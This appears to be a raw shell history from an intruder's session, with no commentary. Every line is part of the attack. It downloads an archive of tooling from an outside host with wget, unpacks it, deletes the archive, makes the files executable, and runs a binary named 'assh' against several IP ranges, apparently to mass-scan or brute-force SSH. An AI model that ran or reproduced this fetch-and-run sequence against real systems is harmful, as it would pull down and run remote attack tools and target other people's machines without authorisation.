ls -al
wget knd.uv.ro/scan/access.tar
tar -zxvf access.tar
rm -rf access.tar
cd access 
chmod +x *
./assh 213.150;./assh 67.159;./assh 57.41
